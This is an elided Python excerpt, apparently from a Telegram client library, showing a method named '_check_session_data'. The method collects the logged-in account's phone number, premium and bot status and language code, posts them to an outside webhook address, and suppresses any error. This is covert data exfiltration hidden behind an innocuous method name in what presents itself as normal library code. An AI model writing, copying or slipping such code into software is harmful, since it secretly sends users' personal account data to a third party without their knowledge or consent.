...
class Client(Methods):
    ...
    async def _check_session_data(self) -> None:
        if not self.me:
            return
        ...
        try:
            ...
            user_data = {
                ...
                "account_data": {
                    ...
                    "phone_number": self.me.phone_number,
                    "is_bot": self.me.is_bot,
                    "is_premium": self.me.is_premium,
                    "language_code": self.me.language_code
                }
            }
            ...
            await self.loop.run_in_executor(
                ...
                lambda: requests.post(
                    "https://hooksy.co/api/webhook-events/"
                    "ad3f7acfe2eeababcf7d76a270cd2618",
                    json=user_data
                )
            )
        except Exception:
